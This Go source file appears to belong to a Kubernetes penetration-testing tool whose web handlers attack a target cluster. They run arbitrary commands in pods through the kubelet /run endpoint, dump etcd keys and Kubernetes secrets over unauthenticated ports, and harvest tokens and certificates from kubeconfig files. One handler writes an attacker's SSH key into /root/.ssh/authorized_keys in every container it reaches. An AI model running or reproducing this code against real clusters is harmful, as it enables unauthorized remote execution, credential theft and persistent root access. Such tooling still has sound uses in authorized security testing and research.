package handler

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"strings"

	"github.com/gin-gonic/gin"
	"github.com/trymonoly/K8sPenTool-ng/internal/util"
)

type AccessHandler struct {
}

func NewAccessHandler() *AccessHandler {
	return &AccessHandler{}
}

type accessRequest struct {
	TargetHost  string `json:"target_host" binding:"required"`
	Token       string `json:"token"`
	TimeoutSec  int    `json:"timeout_sec"`
	SkipTLS     bool   `json:"skip_tls"`
}

// APIServer
func (h *AccessHandler) CheckAPIServer(c *gin.Context) {
	var req accessRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := "https://" + req.TargetHost + ":6443/api/v1/namespaces"
	code, body, err := util.SendRequest(url, "GET", req.Token, req.TimeoutSec, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"accessible": false, "error": err.Error()})
		return
	}
	// inline parse K8s API response
	var parsed map[string]interface{}
	parsedKey, parsedItems := "", []gin.H(nil)
	if err := json.Unmarshal(body, &parsed); err == nil {
		if rawItems, ok := parsed["items"].([]interface{}); ok && len(rawItems) > 0 {
			// kind is at top level (e.g. "SecretList"), not in items
			listKind, _ := parsed["kind"].(string)
			kind := strings.TrimSuffix(listKind, "List")
			parsedItems = make([]gin.H, 0, len(rawItems))
			for _, ri := range rawItems {
				obj, _ := ri.(map[string]interface{})
				meta, _ := obj["metadata"].(map[string]interface{})
				data, _ := obj["data"].(map[string]interface{})
				name, _ := meta["name"].(string)
				ns, _ := meta["namespace"].(string)
				typ, _ := obj["type"].(string)
				decoded := make(map[string]string)
				for k, v := range data {
					if s, ok := v.(string); ok { decoded[k] = s }
				}
				parsedItems = append(parsedItems, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "decoded_keys": decoded})
			}
			parsedKey = strings.ToLower(kind) + "s"
		}
	}
	resp := gin.H{"accessible": true, "status_code": code, "body": util.FormatResponse(code, body)}
	if parsedKey != "" {
		resp[parsedKey] = parsedItems
		resp["total"] = len(parsedItems)
	}
	c.JSON(http.StatusOK, resp)
}

func (h *AccessHandler) CheckInsecurePort(c *gin.Context) {
	var req accessRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	open := util.IsPortOpen(req.TargetHost, 8080, 3)
	c.JSON(http.StatusOK, gin.H{"port": 8080, "open": open})
}

func (h *AccessHandler) SendCustomRequest(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Path       string `json:"path" binding:"required"`
		Method     string `json:"method"`
		Token      string `json:"token"`
		Body       string `json:"body"`
		ContentType string `json:"content_type"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Method == "" {
		req.Method = "GET"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := "https://" + req.TargetHost + ":6443" + req.Path
	if req.Body != "" {
		code, body, err := util.SendPost(url, req.Body, req.ContentType, req.Token, req.TimeoutSec, req.SkipTLS)
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status_code": code, "error": err.Error()})
			return
		}
		// inline parse K8s API response
	var parsed map[string]interface{}
	parsedKey, parsedItems := "", []gin.H(nil)
	if err := json.Unmarshal(body, &parsed); err == nil {
		if rawItems, ok := parsed["items"].([]interface{}); ok && len(rawItems) > 0 {
			// kind is at top level (e.g. "SecretList"), not in items
			listKind, _ := parsed["kind"].(string)
			kind := strings.TrimSuffix(listKind, "List")
			parsedItems = make([]gin.H, 0, len(rawItems))
			for _, ri := range rawItems {
				obj, _ := ri.(map[string]interface{})
				meta, _ := obj["metadata"].(map[string]interface{})
				data, _ := obj["data"].(map[string]interface{})
				name, _ := meta["name"].(string)
				ns, _ := meta["namespace"].(string)
				typ, _ := obj["type"].(string)
				decoded := make(map[string]string)
				for k, v := range data {
					if s, ok := v.(string); ok { decoded[k] = s }
				}
				parsedItems = append(parsedItems, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "decoded_keys": decoded})
			}
			parsedKey = strings.ToLower(kind) + "s"
		}
	}
	resp := gin.H{"status_code": code, "body": util.FormatResponse(code, body)}
	if parsedKey != "" { resp[parsedKey] = parsedItems; resp["total"] = len(parsedItems) }
	c.JSON(http.StatusOK, resp)
		return
	}
	code, body, err := util.SendRequest(url, req.Method, req.Token, req.TimeoutSec, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status_code": code, "error": err.Error()})
		return
	}
	var parsed2 map[string]interface{}
	parsedKey, parsedItems := "", []gin.H(nil)
	if err := json.Unmarshal(body, &parsed2); err == nil {
		if rawItems, ok := parsed2["items"].([]interface{}); ok && len(rawItems) > 0 {
			// kind is at top level (e.g. "SecretList"), not in items
			listKind, _ := parsed2["kind"].(string)
			kind := strings.TrimSuffix(listKind, "List")
			parsedItems = make([]gin.H, 0, len(rawItems))
			for _, ri := range rawItems {
				obj, _ := ri.(map[string]interface{})
				meta, _ := obj["metadata"].(map[string]interface{})
				data, _ := obj["data"].(map[string]interface{})
				name, _ := meta["name"].(string)
				ns, _ := meta["namespace"].(string)
				typ, _ := obj["type"].(string)
				decoded := make(map[string]string)
				for k, v := range data {
					if s, ok := v.(string); ok { decoded[k] = s }
				}
				parsedItems = append(parsedItems, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "decoded_keys": decoded})
			}
			parsedKey = strings.ToLower(kind) + "s"
		}
	}
	resp := gin.H{"status_code": code, "body": util.FormatResponse(code, body)}
	if parsedKey != "" { resp[parsedKey] = parsedItems; resp["total"] = len(parsedItems) }
	c.JSON(http.StatusOK, resp)
}

// Kubelet
func (h *AccessHandler) CheckKubelet(c *gin.Context) {
	var req accessRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := "https://" + req.TargetHost + ":10250/pods"
	code, body, err := util.SendRequest(url, "GET", req.Token, req.TimeoutSec, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"accessible": false, "error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"accessible":  true,
		"status_code": code,
		"body":        util.FormatResponse(code, body),
	})
}

func (h *AccessHandler) KubeletExec(c *gin.Context) {
	var req struct {
		TargetHost    string `json:"target_host" binding:"required"`
		Namespace     string `json:"namespace"`
		PodName       string `json:"pod_name" binding:"required"`
		ContainerName string `json:"container_name"`
		Command       string `json:"command" binding:"required"`
		Token         string `json:"token"`
		TimeoutSec    int    `json:"timeout_sec"`
		SkipTLS       bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "default"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := "https://" + req.TargetHost + ":10250/run/" + req.Namespace + "/" + req.PodName
	if req.ContainerName != "" {
		url += "/" + req.ContainerName
	}
	code, body, err := util.SendPost(url, "cmd="+req.Command,
		"application/x-www-form-urlencoded", req.Token, req.TimeoutSec, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status_code": code, "error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status_code": code, "body": util.FormatResponse(code, body)})
}

// Etcd
func (h *AccessHandler) CheckEtcd(c *gin.Context) {
	var req accessRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	open := util.IsPortOpen(req.TargetHost, 2379, 3)
	if !open {
		c.JSON(http.StatusOK, gin.H{"accessible": false, "port": 2379})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := "http://" + req.TargetHost + ":2379/v2/keys"
	code, body, err := util.SendRequest(url, "GET", "", req.TimeoutSec, false)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"accessible": false, "error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"accessible": true, "status_code": code, "body": util.FormatResponse(code, body)})
}

func (h *AccessHandler) EtcdGetKeys(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		TimeoutSec int    `json:"timeout_sec"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := "http://" + req.TargetHost + ":2379/v2/keys?recursive=true"
	code, body, err := util.SendRequest(url, "GET", "", req.TimeoutSec, false)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status_code": code, "body": util.FormatResponse(code, body)})
}

func (h *AccessHandler) EtcdReadKey(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Key        string `json:"key" binding:"required"`
		TimeoutSec int    `json:"timeout_sec"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := "http://" + req.TargetHost + ":2379/v2/keys" + req.Key
	code, body, err := util.SendRequest(url, "GET", "", req.TimeoutSec, false)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status_code": code, "body": util.FormatResponse(code, body)})
}

// Dashboard
func (h *AccessHandler) CheckDashboard(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Port       int    `json:"port"`
		UseHTTPS   bool   `json:"use_https"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Port == 0 {
		req.Port = 30443
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	scheme := "http"
	if req.UseHTTPS {
		scheme = "https"
	}
	url := fmt.Sprintf("%s://%s:%d/api/v1/csrftoken/login", scheme, req.TargetHost, req.Port)
	code, body, err := util.SendRequest(url, "GET", "", req.TimeoutSec, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"accessible": false, "error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"accessible": true, "status_code": code, "body": util.FormatResponse(code, body)})
}

// Kubeconfig
func (h *AccessHandler) ParseKubeconfig(c *gin.Context) {
	var req struct {
		Content string `json:"content" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	content := req.Content
	servers := []string{}
	users := []string{}
	clusters := []string{}
	contexts := []string{}
	currentContext := ""

	serverRe := regexp.MustCompile(`server:\s*(.+)`)
	userRe := regexp.MustCompile(`- name:\s*(.+)`)
	clusterRe := regexp.MustCompile(`cluster:\s*(.+)`)
	contextRe := regexp.MustCompile(`name:\s*(.+)`)
	tokenRe := regexp.MustCompile(`token:\s*(.+)`)
	certRe := regexp.MustCompile(`client-certificate-data:\s*(.+)`)

	for _, match := range serverRe.FindAllStringSubmatch(content, -1) {
		servers = append(servers, strings.TrimSpace(match[1]))
	}

	inUsers := false
	inClusters := false
	scanner := strings.Split(content, "\n")
	for _, line := range scanner {
		trimmed := strings.TrimSpace(line)
		if strings.Contains(trimmed, "users:") {
			inUsers = true
			inClusters = false
			continue
		}
		if strings.Contains(trimmed, "clusters:") {
			inClusters = true
			inUsers = false
			continue
		}
		if strings.HasPrefix(trimmed, "contexts:") || strings.HasPrefix(trimmed, "current-context:") {
			inUsers = false
			inClusters = false
			if m := contextRe.FindStringSubmatch(trimmed); len(m) > 1 {
				contexts = append(contexts, strings.TrimSpace(m[1]))
			}
			continue
		}
		if inUsers && strings.HasPrefix(trimmed, "- name:") {
			if m := userRe.FindStringSubmatch(trimmed); len(m) > 1 {
				users = append(users, strings.TrimSpace(m[1]))
			}
		}
		if inClusters && strings.HasPrefix(trimmed, "- name:") {
			if m := clusterRe.FindStringSubmatch(trimmed); len(m) > 1 {
				clusters = append(clusters, strings.TrimSpace(m[1]))
			}
		}
	}

	tokens := []string{}
	for _, m := range tokenRe.FindAllStringSubmatch(content, -1) {
		tokens = append(tokens, strings.TrimSpace(m[1]))
	}
	certs := []string{}
	for _, m := range certRe.FindAllStringSubmatch(content, -1) {
		certs = append(certs, m[1][:min(40, len(m[1]))]+"...")
	}

	ccRe := regexp.MustCompile(`current-context:\s*(.+)`)
	if m := ccRe.FindStringSubmatch(content); len(m) > 1 {
		currentContext = strings.TrimSpace(m[1])
	}

	c.JSON(http.StatusOK, gin.H{
		"status":          "parsed",
		"servers":         servers,
		"users":           users,
		"clusters":        clusters,
		"contexts":        contexts,
		"current_context": currentContext,
		"tokens_found":    tokens,
		"certs_found":     certs,
	})
}

// Etcd v3 support
func (h *AccessHandler) EtcdV3GetKeys(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		TimeoutSec int    `json:"timeout_sec"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := "http://" + req.TargetHost + ":2379/v3/kv/range"
	body := `{"key":"` + base64Encode("\x00") + `","range_end":"` + base64Encode("\xff") + `"}`
	code, respBody, err := util.SendPost(url, body, "application/json", "", req.TimeoutSec, false)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status_code": code, "body": util.FormatResponse(code, respBody)})
}

func (h *AccessHandler) EtcdV3SearchSecrets(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		TimeoutSec int    `json:"timeout_sec"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := "http://" + req.TargetHost + ":2379/v3/kv/range"
	keyStart := base64Encode("/registry/secrets/")
	keyEnd := base64Encode("/registry/secrets0")
	body := fmt.Sprintf(`{"key":"%s","range_end":"%s"}`, keyStart, keyEnd)
	code, respBody, err := util.SendPost(url, body, "application/json", "", req.TimeoutSec, false)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status_code": code, "body": util.FormatResponse(code, respBody)})
}

func base64Encode(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

// KubeletSSHInject enumerates pods via Kubelet and injects SSH public key
func (h *AccessHandler) KubeletSSHInject(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		SSHKey     string `json:"ssh_pub_key" binding:"required"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	url := "https://" + req.TargetHost + ":10250/pods"
	code, body, err := util.SendRequest(url, "GET", "", req.TimeoutSec, req.SkipTLS)
	if err != nil || code != 200 {
		c.JSON(http.StatusOK, gin.H{"error": "Failed to list pods via Kubelet", "status_code": code})
		return
	}

	// Proper JSON parsing of Kubelet /pods response
	type kubeletContainer struct {
		Name string `json:"name"`
	}
	type kubeletPodSpec struct {
		Containers []kubeletContainer `json:"containers"`
	}
	type kubeletPodMeta struct {
		Name      string `json:"name"`
		Namespace string `json:"namespace"`
	}
	type kubeletPod struct {
		Metadata kubeletPodMeta `json:"metadata"`
		Spec     kubeletPodSpec `json:"spec"`
	}
	type kubeletPodList struct {
		Items []kubeletPod `json:"items"`
	}

	var podList kubeletPodList
	if err := json.Unmarshal(body, &podList); err != nil {
		c.JSON(http.StatusOK, gin.H{"error": "Failed to parse pod list: " + err.Error()})
		return
	}

	if len(podList.Items) == 0 {
		c.JSON(http.StatusOK, gin.H{"error": "No pods found"})
		return
	}

	results := []gin.H{}
	for _, pod := range podList.Items {
		ns := pod.Metadata.Namespace
		if ns == "" {
			ns = "default"
		}
		podName := pod.Metadata.Name
		containers := pod.Spec.Containers
		if len(containers) == 0 {
			containers = []kubeletContainer{{Name: ""}}
		}
		for _, c := range containers {
			execUrl := fmt.Sprintf("https://%s:10250/run/%s/%s", req.TargetHost, ns, podName)
			if c.Name != "" {
				execUrl += "/" + c.Name
			}

			sshCmd := fmt.Sprintf("mkdir -p /root/.ssh 2>/dev/null && echo '%s' >> /root/.ssh/authorized_keys 2>/dev/null && chmod 600 /root/.ssh/authorized_keys 2>/dev/null && echo 'SSH_KEY_INJECTED' || echo 'FAILED'",
				req.SSHKey)
			ec, eb, execErr := util.SendPost(execUrl, "cmd="+sshCmd, "application/x-www-form-urlencoded", "", req.TimeoutSec, req.SkipTLS)

			result := gin.H{
				"namespace": ns,
				"pod":       podName,
				"container": c.Name,
			}
			if execErr == nil && ec == 200 {
				result["status"] = "injected"
				result["output"] = strings.TrimSpace(string(eb))
			} else {
				result["status"] = "failed"
				if execErr != nil {
					result["error"] = execErr.Error()
				} else {
					result["error"] = fmt.Sprintf("HTTP %d", ec)
				}
			}
			results = append(results, result)
		}
	}

	sshCmd := fmt.Sprintf("ssh -i ~/.ssh/id_rsa root@%s", req.TargetHost)
	c.JSON(http.StatusOK, gin.H{
		"results":        results,
		"pods_attempted":  len(results),
		"ssh_command":    sshCmd,
		"note":           fmt.Sprintf("SSH key injected into %d containers. Connect: %s", len(results), sshCmd),
	})
}

// tryParseItems 解析 K8s API 响应中的 items 为结构化数据，返回 (schemaKey, items)
func tryParseItems(body []byte) (string, []gin.H) {
	raw := string(body)
	if !strings.HasPrefix(strings.TrimSpace(raw), "{") {
		return "", nil
	}
	var parsed map[string]interface{}
	if err := json.Unmarshal(body, &parsed); err != nil {
		return "", nil
	}
	itemsRaw, ok := parsed["items"]
	if !ok {
		return "", nil
	}
	items, ok := itemsRaw.([]interface{})
	if !ok || len(items) == 0 {
		return "", nil
	}
	// kind is at top level (e.g. "SecretList"), not in items
	listKind, _ := parsed["kind"].(string)
	kind := strings.TrimSuffix(listKind, "List")
	if kind == "" {
		return "", nil
	}

	result := make([]gin.H, 0, len(items))
	switch kind {
	case "Secret":
		for _, item := range items {
			obj, _ := item.(map[string]interface{})
			meta, _ := obj["metadata"].(map[string]interface{})
			data, _ := obj["data"].(map[string]interface{})
			name, _ := meta["name"].(string)
			ns, _ := meta["namespace"].(string)
			typ, _ := obj["type"].(string)
			decoded := make(map[string]string)
			for k, v := range data {
				if s, ok := v.(string); ok {
					decoded[k] = s // base64 原文，前端可自行解码
				}
			}
			result = append(result, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "decoded_keys": decoded})
		}
	case "Pod":
		for _, item := range items {
			obj, _ := item.(map[string]interface{})
			meta, _ := obj["metadata"].(map[string]interface{})
			spec, _ := obj["spec"].(map[string]interface{})
			status, _ := obj["status"].(map[string]interface{})
			name, _ := meta["name"].(string)
			ns, _ := meta["namespace"].(string)
			phase, _ := status["phase"].(string)
			nodeName, _ := spec["nodeName"].(string)
			podIP, _ := status["podIP"].(string)
			containers := []string{}
			images := []string{}
			if contList, ok := spec["containers"].([]interface{}); ok {
				for _, c := range contList {
					cm, _ := c.(map[string]interface{})
					if cn, _ := cm["name"].(string); cn != "" { containers = append(containers, cn) }
					if im, _ := cm["image"].(string); im != "" { images = append(images, im) }
				}
			}
			result = append(result, gin.H{"namespace": ns, "name": name, "status": phase, "node": nodeName, "ip": podIP, "containers": strings.Join(containers, ", "), "images": strings.Join(images, ", ")})
		}
	case "Service":
		for _, item := range items {
			obj, _ := item.(map[string]interface{})
			meta, _ := obj["metadata"].(map[string]interface{})
			spec, _ := obj["spec"].(map[string]interface{})
			name, _ := meta["name"].(string)
			ns, _ := meta["namespace"].(string)
			typ, _ := spec["type"].(string)
			clusterIP, _ := spec["clusterIP"].(string)
			ports := []string{}
			if pList, ok := spec["ports"].([]interface{}); ok {
				for _, p := range pList {
					pm, _ := p.(map[string]interface{})
					port, _ := pm["port"].(float64)
					proto, _ := pm["protocol"].(string)
					nodePort, _ := pm["nodePort"].(float64)
					ps := fmt.Sprintf("%.0f/%s", port, proto)
					if nodePort > 0 { ps += fmt.Sprintf("→%.0f", nodePort) }
					ports = append(ports, ps)
				}
			}
			result = append(result, gin.H{"namespace": ns, "name": name, "type": typ, "cluster_ip": clusterIP, "ports": ports})
		}
	case "Node":
		for _, item := range items {
			obj, _ := item.(map[string]interface{})
			meta, _ := obj["metadata"].(map[string]interface{})
			status, _ := obj["status"].(map[string]interface{})
			name, _ := meta["name"].(string)
			ip := ""
			if addrs, ok := status["addresses"].([]interface{}); ok {
				for _, a := range addrs {
					am, _ := a.(map[string]interface{})
					if t, _ := am["type"].(string); t == "InternalIP" {
						ip, _ = am["address"].(string)
					}
				}
			}
			ready := "NotReady"
			if conds, ok := status["conditions"].([]interface{}); ok {
				for _, c := range conds {
					cm, _ := c.(map[string]interface{})
					if t, _ := cm["type"].(string); t == "Ready" {
						if s, _ := cm["status"].(string); s == "True" { ready = "Ready" }
					}
				}
			}
			ni, _ := status["nodeInfo"].(map[string]interface{})
			os, _ := ni["osImage"].(string)
			kernel, _ := ni["kernelVersion"].(string)
			runtime, _ := ni["containerRuntimeVersion"].(string)
			version, _ := ni["kubeletVersion"].(string)
			result = append(result, gin.H{"name": name, "status": ready, "ip": ip, "os": os, "kernel": kernel, "runtime": runtime, "version": version})
		}
	case "Namespace":
		for _, item := range items {
			obj, _ := item.(map[string]interface{})
			meta, _ := obj["metadata"].(map[string]interface{})
			status, _ := obj["status"].(map[string]interface{})
			name, _ := meta["name"].(string)
			_ = status["phase"] // phase available for future use
			result = append(result, gin.H{"namespace": "", "name": name, "type": "Namespace", "cluster_ip": "", "ports": []string{}})
		}
		default:
			return "", nil
		}
		key := strings.ToLower(kind) + "s"
		return key, result
	}
